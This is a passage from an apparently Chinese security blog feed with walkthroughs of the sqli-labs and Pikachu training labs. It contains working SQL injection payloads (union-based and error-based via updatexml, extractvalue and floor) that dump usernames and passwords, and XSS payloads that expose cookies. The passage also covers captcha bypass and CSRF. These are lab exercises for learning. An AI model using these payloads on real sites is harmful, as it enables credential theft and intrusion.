class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">23</span> </span><br><span class="line"></span><br><span class="line">获取列长度：</span><br><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">20</span><span class="keyword">order</span><span class="operator">%</span><span class="number">20</span><span class="keyword">by</span><span class="operator">%</span><span class="number">203</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(username,<span class="string">&#x27;-&#x27;</span>,password),<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>如图所示是最后的结果</p><p><img src="/post/b3432909/image-20231210145743966.png" alt="image-20231210145743966" style="zoom:25%;"></p><h3 id="less-3">Less-3</h3><p>该页面增加了重定向，直接在重定向界面进行发送包，sql语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">数字型发现没反应：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">23</span> </span><br><span class="line"></span><br><span class="line">字符型报错：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">23</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">23</span> </span><br><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">猜测有括号，通过尝试确定该<span class="keyword">sql</span>语句有括号需要闭合：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">获取列长度：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">order</span><span class="operator">%</span><span class="number">20</span><span class="keyword">by</span><span class="operator">%</span><span class="number">203</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">获取用户信息：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(username,<span class="string">&#x27;-&#x27;</span>,password),<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后结果如图所示</p><p><img src="/post/b3432909/image-20231210151338820.png" alt="image-20231210151338820" style="zoom:25%;"></p><h3 id="less-4">Less-4</h3>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;sqli-labs&quot;&gt;sqli-labs&lt;/h2&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>pikachu通关</title>
    <link href="http://example.com/post/7cfe8c25.html"/>
    <id>http://example.com/post/7cfe8c25.html</id>
    <published>2023-12-06T13:23:56.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>总耗时：两天</p><span id="more"></span><p>常见漏洞学习：<a href="https://cloud.tencent.com/developer/article/1697045">PHP一些常见的漏洞梳理-腾讯云开发者社区-腾讯云(tencent.com)</a></p><h2 id="pikachu通关">pikachu通关</h2><h3 id="暴力破解">暴力破解</h3><h4 id="基于表单的暴力破解">基于表单的暴力破解</h4><p>lz随便试了下admin+123456就顺利通过了</p><figure><img src="/post/7cfe8c25/image-20231207133307422.png" alt="image-20231207133307422"><figcaption aria-hidden="true">image-20231207133307422</figcaption></figure><h4 id="验证码绕过on-server">验证码绕过（On server）</h4><p>利用burpsuite抓包，通过测试发现看到多次repeat相同的vcode也可以，说明验证码不是一次性</p><p>还是可以用上面基于表单的暴力破解方式</p><h4 id="验证码绕过on-client">验证码绕过（On Client）</h4><p>由于是前端验证，所以只有在浏览器访问时验证码填错会有提示，导致用户密码无法传到后端</p><p><img src="/post/7cfe8c25/image-20231207135044509.png" alt="image-20231207135044509" style="zoom:50%;"></p><p>但是用repeater发送我们构造的请求包时省去了前端验证这一阶段，直接向后端发送数据，就算不用验证码也可以正确返回，如图所示，并不是验证码输入错误，或者没有输入</p><p><img src="/post/7cfe8c25/image-20231207135214447.png" alt="image-20231207135214447" style="zoom:50%;"></p><h4 id="token防爆破">token防爆破</h4><p>同一个token发送两次效果如下</p><p><img src="/post/7cfe8c25/image-20231207135501884.png" alt="image-20231207135501884" style="zoom: 25%;"></p><p>通过分析网站源代码可以看到该token出现在前端html文件上，爆破时添加上该value值作为传递的token</p><p><img src="/post/7cfe8c25/image-20231207140104370.png" alt="image-20231207140104370" style="zoom:25%;"></p><p>顺便学习burp四种爆破方式</p><ol type="1"><li><p>Sinper（狙击手）</p><p>sinper使用一个字典，主要是将标记的数据进行逐个遍历替换爆破次数=标记字段数*字典字段数</p></li><li><p>Battering ram（攻城槌）：</p><p>Batteringram使用一个字典，将包内所有标记的数据进行同时替换再发出，也就是每次爆破每个要爆破的地方的值都会是一样，因为是同时向后更新爆破次数=字典字段数量</p></li><li><p>Pitchfork（干草叉）：</p><p>Pitchfork对每个标记字段单独设置字典，按照一一对应的关系取最少的组合，和Batter类似，但是会为每一个标记字段单独设置字典爆破次数=最少的字段字段数</p></li><li><p>Cluster bomb（集束炸弹）：</p><p>Clusterbomb使用穷举法，对每个标记字段都遍历字典，和pitchFork一样为每一个标记字段单独设置字典，并用穷举更新而不是一起往后移动</p></li></ol><p>爆破次数=每个字典数量的乘积</p><p>这里我采用Clusterbomb爆破方式，并选取三个标记点，通过测试发现集束炸弹不行，的用pitchFork才能正确匹配，可能是Grep-Extract可用于将响应中的有用信息提取到攻击结果表中。对于列表中配置的每个项，burp将添加一个新的results列，其中包含为该项提取的文本。但是由于该方式是进行穷举推荐，所以没办法进行一一匹配</p><p><img src="/post/7cfe8c25/image-20231207142928283.png" alt="image-20231207142928283" style="zoom: 25%;"></p><p>添加该字段作为token</p><p><img src="/post/7cfe8c25/image-20231207143109087.png" alt="image-20231207143109087" style="zoom: 25%;"></p><p>username，password，token添加方式如下</p><p><img src="/post/7cfe8c25/image-20231207143258768.png" alt="image-20231207143258768" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231207143317448.png" alt="image-20231207143317448" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231207143349561.png" alt="image-20231207143349561" style="zoom:25%;"></p><p>如图所示，成功爆破</p><p><img src="/post/7cfe8c25/image-20231207144353654.png" alt="image-20231207144353654" style="zoom: 25%;"></p><h3 id="跨站脚本攻击">跨站脚本攻击</h3><h4 id="反射型xssget">反射型xss（get）</h4><p>通过测试发现输入有长度限制，应该是前端做了限制，通过查看源代码检查</p><p><img src="/post/7cfe8c25/image-20231207144620852.png" alt="image-20231207144620852" style="zoom:33%;"></p><p>传到burp的重放窗口即可</p><p><img src="/post/7cfe8c25/image-20231207144956253.png" alt="image-20231207144956253" style="zoom: 25%;"></p><p>将我们要传入的参数构造成url</p><p><img src="/post/7cfe8c25/image-20231207145340312.png" alt="image-20231207145340312" style="zoom:33%;"></p><h4 id="反射型xsspost">反射型xss（post）</h4><p>在构造语句上写上我们构造的xss漏洞即可，登陆之后会这样显示</p><p><img src="/post/7cfe8c25/image-20231207150023707.png" alt="image-20231207150023707" style="zoom: 33%;"><img src="/post/7cfe8c25/image-20231207150036718.png" alt="image-20231207150036718" style="zoom: 33%;"></p><h4 id="存储型xss">存储型xss</h4><p>留言什么下面就会显示什么，就将我们构造好的xss语句留言到下面，就会弹出cookie</p><p><img src="/post/7cfe8c25/image-20231207150257560.png" alt="image-20231207150257560" style="zoom:33%;"><img src="/post/7cfe8c25/image-20231207150225795.png" alt="image-20231207150225795" style="zoom:33%;"></p><h4 id="dom型xss">DOM型xss</h4><p>我们输入什么下面的what do yousee会帮我们构造一个我们输入的内容的链接</p><p><img src="/post/7cfe8c25/image-20231207150613426.png" alt="image-20231207150613426" style="zoom:33%;"><img src="/post/7cfe8c25/image-20231207150622126.png" alt="image-20231207150622126" style="zoom:33%;"></p><p>查看前端逻辑，这儿是将text作为url，但是这里的str是有我们输入的，我们可以想办法使得该处能执行我们构造的xss恶意代码</p><p><img src="/post/7cfe8c25/image-20231207150801035.png" alt="image-20231207150801035" style="zoom:33%;"></p><p>我们构造语句使得href闭合，并构造出了onclick的命令，使得点击该按钮会弹出cookie，效果如图所示</p><p><img src="/post/7cfe8c25/image-20231207151232033.png" alt="image-20231207151232033" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231207151319448.png" alt="image-20231207151319448" style="zoom:33%;"></p><h4 id="dom型xss-x">DOM型xss-x</h4><p>一样的构造方式</p><p><img src="/post/7cfe8c25/image-20231207151544599.png" alt="image-20231207151544599" style="zoom:33%;"></p><h4 id="xss之盲打">xss之盲打</h4><p>插入xss登陆后台弹出了cookie（奇奇怪怪）</p><p><img src="/post/7cfe8c25/image-20231207152227212.png" alt="image-20231207152227212" style="zoom: 25%;"></p><h4 id="xss之过滤">xss之过滤</h4><p>如图所示，明显的过滤掉了后面的所有内容</p><p><img src="/post/7cfe8c25/image-20231207152449174.png" alt="image-20231207152449174" style="zoom:25%;"></p><p>通过多次测试发现<code>&lt;script&gt;</code>被过滤掉了，搜索之后发现了</p><h5 id="绕过-script过滤">绕过 <code>&lt;SCRIPT&gt;</code>过滤</h5><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是还是有方法插入javascript 的。我 们看看事件处理器的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt; </span><br></pre></td></tr></table></figure><p>在 html 里啊。这个 Onload关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload事件在你的代码之前已经被处理了。那就不会触发了</p><p>如图所示，再次成功获取到cookie</p><p><img src="/post/7cfe8c25/image-20231207153052193.png" alt="image-20231207153052193" style="zoom:25%;"></p><h4 id="xss之htmlspecialchars">xss之htmlspecialchars</h4><p>如图所示，我们输入的内容会被放入href中，所以采取的方式是将href进行闭合然后增加onclick函数功能执行xss恶意代码，构造效果如下图所示</p><p><img src="/post/7cfe8c25/image-20231207153809546.png" alt="image-20231207153809546" style="zoom: 25%;"><img src="/post/7cfe8c25/image-20231207153949758.png" alt="image-20231207153949758" style="zoom:25%;"></p><p>同样的构造方式发现单引号没办法使href闭合</p><p><img src="/post/7cfe8c25/image-20231207154126687.png" alt="image-20231207154126687" style="zoom:25%;"></p><p>这里通过学习发现要用js伪协议</p><h5 id="javascript伪协议是什么">JavaScript伪协议是什么？</h5><p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，</p><p>而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:</p><p>我们可以在浏览地址栏里输入"javascript:alert(‘JS!’);"，点转到后会发现，实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p><p>通俗地讲，JavaScript伪协议不是真实存在的协议，它的功能是将JavaScript：后面的语句当做JavaScript代码在本页面执行，并不跳转到其他网页，而是结果返回给当前页面，相当于一个伪造的超链接，它经常与a标签一起使用，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(/xss/) &gt; 点击我&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>功能是在当前页面弹出一个弹窗</p><p>如图所示，通过构造javascript伪协议成功获取了cookie</p><p><img src="/post/7cfe8c25/image-20231207154931831.png" alt="image-20231207154931831" style="zoom:25%;"></p><h4 id="xss之js输出">xss之js输出</h4><p>查看源代码发现我们输入的内容直接就在前端的script里面，所以我们只需要添加好我们要构造的xss之后闭合，构造内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nba&#x27;;alert(document.cookie);$ms=&#x27;tmac</span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231207155513682.png" alt="image-20231207155513682" style="zoom: 25%;"><img src="/post/7cfe8c25/image-20231207155706434.png" alt="image-20231207155706434" style="zoom: 40%;"><img src="/post/7cfe8c25/image-20231207155417236.png" alt="image-20231207155417236" style="zoom: 25%;"></p><h4 id="xss防范">XSS防范</h4><p><strong>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</strong></p><p><strong>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</strong></p><h3 id="crsf">CRSF</h3><h4 id="crsfget">CRSF(get)</h4><p>将修改个人信息的请求包通过burpsuite生成POC（一个HTML页面），就是这个html相当于已经将所有修改的信息已经构造好了，只需要用户点击按钮就可以了，如下图所示是生成的html代码</p><p><img src="/post/7cfe8c25/image-20231207190431681.png" alt="image-20231207190431681" style="zoom:33%;"></p><p>按理说要将这个文件上传看到效果，但是该任务没有上传文件的接口，所以我尝试将构造的html放在源码中，如下图更改成功了</p><p><img src="/post/7cfe8c25/image-20231207190951656.png" alt="image-20231207190951656" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231207191022383.png" alt="image-20231207191022383" style="zoom:25%;"></p><h4 id="crsfpost">CRSF(post)</h4><p>一样的方式构造，如图所示</p><p><img src="/post/7cfe8c25/image-20231207191553418.png" alt="image-20231207191553418" style="zoom: 25%;"><img src="/post/7cfe8c25/image-20231207191727734.png" alt="image-20231207191727734" style="zoom:25%;"></p><h4 id="crsftoken">CRSF(Token)</h4><p>还是先用burpsuite抓包，可以看到这次虽然还是get的请求包但是请求头的参数多了token</p><p><img src="/post/7cfe8c25/image-20231208082955540.png" alt="image-20231208082955540" style="zoom: 33%;"></p><p>无法进行crsf攻击，因为每次的token都是一次性生成的，当每次提交表单时，这个<code>Token</code>值就会传到后台与<code>SESSION</code>中的<code>Token</code>进行比较，若不相等，此次表单则提交失败。所以黑客由于不能得知用户当前的<code>Token</code>值，从而无法进行CSRF攻击。</p><h4 id="csrf防范">CSRF防范</h4><ul><li>对敏感信息的操作增加安全的token；</li><li>对敏感信息的操作增加安全的验证码；</li><li>对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</li></ul><h3 id="sql-inject"><strong>SQL-Inject</strong></h3><h4 id="数字型注入post">数字型注入（post）</h4><p>可以看到是通过单选框选择的id，所以用burpsuite抓包测试，通过检验发现是数字型</p><p><img src="/post/7cfe8c25/image-20231208083917080.png" alt="image-20231208083917080" style="zoom: 25%;"></p><p>构造如下代码获取返回数据的长度，数据库，表，数据</p><p><img src="/post/7cfe8c25/image-20231208084055778.png" alt="image-20231208084055778" style="zoom: 30%;"><img src="/post/7cfe8c25/image-20231208084125041.png" alt="image-20231208084125041" style="zoom: 33%;"><img src="/post/7cfe8c25/image-20231208084151070.png" alt="image-20231208084151070" style="zoom: 33%;"><img src="/post/7cfe8c25/image-20231208084321677.png" alt="image-20231208084321677" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231208084431089.png" alt="image-20231208084431089" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231208084636244.png" alt="image-20231208084636244" style="zoom:25%;"></p><h4 id="字符型注入post">字符型注入（POST）</h4><p>该板块和数字型区别就是该板块需要闭合单引号，并且对后面添加注释，构造语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(username),group_concat(password) from users where id=1 or id =2#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="/post/7cfe8c25/image-20231208085336753.png" alt="image-20231208085336753" style="zoom:50%;"></p><h4 id="搜索型注入">搜索型注入</h4><p>模糊查询的语句一般如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%&#123;$username&#125;%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>所以需要将%闭合才能执行我们的查询</p><p>爆破查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="operator">%</span><span class="string">&#x27; union select 1,2,concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,username,password) from users #</span></span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231208090040649.png" alt="image-20231208090040649" style="zoom:25%;"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这段 SQL 查询的含义是从名为 users 的表中选择三列数据，并在第三列中使用 CONCAT<span class="built_in">_</span>WS 函数连接 username 列和 password 列，并使用横杠 - 作为分隔符。这是一种常见的方式，用于在 SQL 注入攻击中尝试获取用户凭证信息的测试。</span><br><span class="line"></span><br><span class="line">具体来说：</span><br><span class="line"></span><br><span class="line">select 1,2,concat<span class="built_in">_</span>ws(&#x27;-&#x27;,username,password) from users: 选择了三列数据，第一列是常数 1，第二列是常数 2，第三列使用 CONCAT<span class="built_in">_</span>WS 将 username 和 password 以横杠分隔的形式连接在一起。</span><br></pre></td></tr></table></figure><h4 id="xx型注入">xx型注入</h4><p>尝试字符型报错如下,1"是我们构造的，</p><p><img src="/post/7cfe8c25/image-20231208101757511.png" alt="image-20231208101757511" style="zoom: 33%;"></p><p>猜测sql查询语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>(<span class="string">&#x27;$name&#x27;</span>);</span><br></pre></td></tr></table></figure><p>构造语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) union select concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,username, password),2 from users #</span></span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/post/7cfe8c25/image-20231208102737831.png" alt="image-20231208102737831" style="zoom:33%;"></p><h4 id="insertupdate注入">"insert/update"注入</h4><h5 id="insert">insert</h5><p>首先构造如下：<code>flower','123','123','123','123','123')#</code></p><p>发现提示注册成功，说明对应的sql语句应该是<code>$query="insert into ember(username,pw,sex,phonenum,email,address) values('$username','$password','$sex','$phonenum','$email','add')";</code></p><p>但是注册成功并不会显示什么，就算我们在这里构造了select语句也没办法看到返回，但是当我们构造的语句使得sql语句无法执行时会出现报错</p><p><img src="/post/7cfe8c25/image-20231208105758494.png" alt="image-20231208105758494" style="zoom:33%;"></p><p>所以只能考虑将我们要输出的内容输出到报错中，使用报错注入，可以使用</p><h6 id="updatexml">updatexml</h6><p><strong>updatexml()</strong>构造如下sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flower<span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database()),1)) #</span></span><br></pre></td></tr></table></figure><p><strong>疑惑点：</strong></p><ul><li><p>为什么这样可以返回数据库：<code>select count(*) from users group by floor(rand(0)*2) and updatexml(1,concat('~',database()),1)</code>，但是这样不行：<code>updatexml(1,concat('~',database()),1)</code></p><p>原因：updatexml只是一个函数，不能直接当作sql语句使用，也就是相当于floor(rand(0)*2)不能当作一个sql语句执行</p></li><li><p>为什么该处不能使用以下sql语句：<code>flower','123','123','123','123','123' )and updatexml(1,concat('~',database()),1)#</code></p><p>原因：正确的sql语句的含义是在insert中调用了updatexml函数，返回报错，但是下面的sql语句将上面的sql语句闭合之后再and一个表达式，首先insert不能and，并且updatexml只是一个函数，只能调用，不能当作sql语句</p></li></ul><p>最后构造出的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flower<span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(concat_ws(&quot;-&quot;,username,password)) from users)),1)) #</span></span><br></pre></td></tr></table></figure><p>如图是返回结果，但是似乎返回结果有长度限制，只能看到admin的用户名和密码</p><p><img src="/post/7cfe8c25/image-20231208154603027.png" alt="image-20231208154603027" style="zoom:33%;"></p><h6 id="extractvalue">extractvalue</h6><p>类似的还有<strong>extractvalue()</strong>函数，构造如下sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flower<span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(concat_ws(&quot;-&quot;,username,password)) from users)))) #</span></span><br></pre></td></tr></table></figure><h6 id="floor">floor</h6><p>构造如下sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flower<span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27; and (select count(*) from information_schema.tables group by concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database(),&#x27;</span><span class="operator">~</span><span class="string">&#x27;,floor(rand(0)*2))))#  </span></span><br></pre></td></tr></table></figure><p>database()就是我们可以构造的payload</p><p>最后构造如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flower&#x27;,&#x27;123&#x27;,&#x27;123&#x27;,&#x27;123&#x27;,&#x27;123&#x27;,&#x27;123&#x27; and (select count(*) from information_schema.tables group by concat(&#x27;~&#x27;,(select group_concat(concat_ws(&quot;-&quot;,username,password)) from users),&#x27;~&#x27;,floor(rand(0)*2))))#  </span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231208160528347.png" alt="image-20231208160528347" style="zoom:50%;"></p><h5 id="update">update</h5><p>通过测试修改信息界面构造如下payload可以成功修改信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span><span class="string">&#x27;,phonenum=&#x27;</span><span class="number">1</span><span class="string">&#x27;,address=&#x27;</span><span class="number">1</span><span class="string">&#x27;,email=&#x27;</span><span class="number">1</span><span class="string">&#x27; where id=2#</span></span><br></pre></td></tr></table></figure><p>猜测查询的sql语句应该是将输入的各参数进行拼接，最后加上where语句，还是一样的方式，再语句中使用我们的报错注入</p><h6 id="updatexml-1">updatexml</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span><span class="string">&#x27;,phonenum=&#x27;</span><span class="number">1</span><span class="string">&#x27;,address=&#x27;</span><span class="number">1</span><span class="string">&#x27;,email=&#x27;</span><span class="number">1</span><span class="string">&#x27; where id=2 and updatexml(1,concat(&quot;~&quot;,database(),&quot;~&quot;),1)#</span></span><br></pre></td></tr></table></figure><p>成功返回</p><p><img src="/post/7cfe8c25/image-20231208161545861.png" alt="image-20231208161545861" style="zoom:33%;"></p><p>如图所示，构造以下sql语句获取用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12&#x27;,phonenum=&#x27;1&#x27;,address=&#x27;1&#x27;,email=&#x27;1&#x27; where id=2 and updatexml(1,concat(&quot;~&quot;,(select group_concat(concat_ws(&quot;-&quot;,username,password)) from users),&quot;~&quot;),1)#</span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231208161804025.png" alt="image-20231208161804025" style="zoom:50%;"></p><h6 id="extractvalue-1">extractvalue</h6><p>构造如下sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span><span class="string">&#x27;,phonenum=&#x27;</span><span class="number">1</span><span class="string">&#x27;,address=&#x27;</span><span class="number">1</span><span class="string">&#x27;,email=&#x27;</span><span class="number">1</span><span class="string">&#x27; where id=2 and extractvalue(1,concat(&quot;~&quot;,(select group_concat(concat_ws(&quot;-&quot;,username,password)) from users),&quot;~&quot;))#</span></span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231208161839153.png" alt="image-20231208161839153" style="zoom:33%;"></p><h6 id="floor-1">floor</h6><p>构造如下sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span><span class="string">&#x27;,phonenum=&#x27;</span><span class="number">1</span><span class="string">&#x27;,address=&#x27;</span><span class="number">1</span><span class="string">&#x27;,email=&#x27;</span><span class="number">1</span><span class="string">&#x27; where id=2 and (select count(*) from information_schema.tables group by concat((select group_concat(concat_ws(&quot;-&quot;,username,password)) from users),floor(rand(0)*2)))#</span></span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231208162357044.png" alt="image-20231208162357044" style="zoom:50%;"></p><h4 id="delete注入">delete注入</h4><p>通过测试，可以提交两份相同内容的留言板，但是删除的时候只会删除选中的，相同的内容不会被删除，说明不是通过内容删除帖子，猜测是通过id，同时尝试上传帖子内容：<code>真好')#</code>，发现删除还是很正常，说明应该没有通过内容查找id</p><p>查看前端代码，发现删除按钮绑定了一个url，包含了id的信息，说明是通过id删除的内容</p><figure><img src="/post/7cfe8c25/image-20231208163053645.png" alt="image-20231208163053645"><figcaption aria-hidden="true">image-20231208163053645</figcaption></figure><p>猜测删除的语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> xxx <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure><p>所以我们可以通过构造url传id，将id构造成能返回私密信息的payload</p><p>流程就是判断是否是字符型，通过实验发现通过报错注入可以成功，将构造好的报错注入sql语句通过url编码之后放到id后面，然后构造sql语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=63%20and%20updatexml(1%2Cconcat(%27%2d%27%2C(select%20group_concat(password)%20from%20users))%2C1)</span><br></pre></td></tr></table></figure><p>如图所示，获取成功</p><p><img src="/post/7cfe8c25/image-20231208194108965.png" alt="image-20231208194108965" style="zoom: 25%;"></p><h4 id="http-header注入">"http header"注入</h4><p>如图所示是输入用户名密码之后的界面，说明前端在发送请求包给后端的时候，后端会获取前端请求头中的这些信息，并显示在界面上，猜测应该是获取到数据之后存在了数据库中，所以我们可以通过构造后端获取的参数的payload，使得后端能够执行我们所要执行的代码</p><p><img src="/post/7cfe8c25/image-20231208201644882.png" alt="image-20231208201644882" 